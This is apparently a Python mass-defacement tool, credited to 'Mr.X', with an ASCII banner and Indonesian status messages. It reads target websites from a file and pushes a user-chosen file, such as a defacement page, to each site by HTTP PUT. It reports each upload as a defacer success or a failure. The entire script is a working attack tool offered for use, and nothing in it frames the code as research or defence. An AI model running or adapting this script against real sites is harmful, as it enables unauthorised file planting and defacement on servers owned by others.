# -*- coding: utf-8 -*-

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")

banner = """


.sSSSSs.    .sSSSSs.    .sSSSSs.    .sSSSSs.    .sSSSSs.    .sSSSSs.    .sSSSSs.    
SSSSSSSSSs. SSSSSSSSSs. SSSSSSSSSs. SSSSSSSSSs. SSSSSSSSSs. SSSSSSSSSs. SSSSSSSSSs. 
S SSS SSSSS S SSS SSSS' S SSS SSSS' S SSS SSSSS S SSS SSSSS S SSS SSSS' S SSS SSSSS 
S  SS SSSSS S  SS       S  SS       S  SS SSSSS S  SS SSSS' S  SS       S  SS SSSS' 
S..SS SSSSS S..SSsss    S..SSsss    S..SSsSSSSS S..SS       S..SSsss    S..SSsSSSa. 
S:::S SSSSS S:::SSSS    S:::SSSS    S:::S SSSSS S:::S SSSSS S:::SSSS    S:::S SSSSS 
S;;;S SSSSS S;;;S       S;;;S       S;;;S SSSSS S;;;S SSSSS S;;;S       S;;;S SSSSS 
S%%%S SSSS' S%%%S SSSSS S%%%S       S%%%S SSSSS S%%%S SSSSS S%%%S SSSSS S%%%S SSSSS 
SSSSSsS;:'  SSSSSsSS;:' SSSSS       SSSSS SSSSS SSSSSsSSSSS SSSSSsSS;:' SSSSS SSSSS 
                                                                                    
                                                                                    
		    Created by Mr.X

 """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " GAGAL UPLOAD KERRR !" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " MR.X DEFACER BERHASIL UPLOAD" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("Enter the script/Yours index: ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)
